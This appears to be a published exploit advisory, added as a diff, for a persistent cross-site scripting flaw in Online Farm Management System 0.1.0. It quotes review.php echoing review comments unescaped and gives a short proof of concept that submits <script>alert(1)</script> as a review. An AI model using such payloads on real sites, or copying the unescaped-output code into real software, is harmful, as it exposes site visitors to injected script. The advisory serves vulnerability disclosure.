@@ -1,0 +1,26 @@
+# Exploit Title: Online Farm Management System 0.1.0 - Persistent Cross-Site Scripting
+# Date: 2020-06-29
+# Exploit Author: KeopssGroup0day,Inc
+# Vendor Homepage:  https://www.sourcecodester.com/php/14198/online-farm-management-system-phpmysql.html
+# Software Link:  https://www.campcodes.com/projects/php/249/farm-management-system-in-php-mysql/
+# Version: 0.1.0
+# Tested on: Kali Linux
+
+Source code(review.php):
+<?php
+if($result) :
+while($row1 = $result->fetch_array()) :
+?>
+  <div class="con">
+  <div class="row">
+  <div class="col-sm-4">
+  <em style="color: black;"><?= $row1['comment']; ?></em>
+</div>
+
+
+POC:
+
+1. http://192.168.1.58/a/review.php?pid=31 go
+2. We send the payload (<script>alert(1)</script>)
+3. Write a review payload and submit
+4. And refresh the page
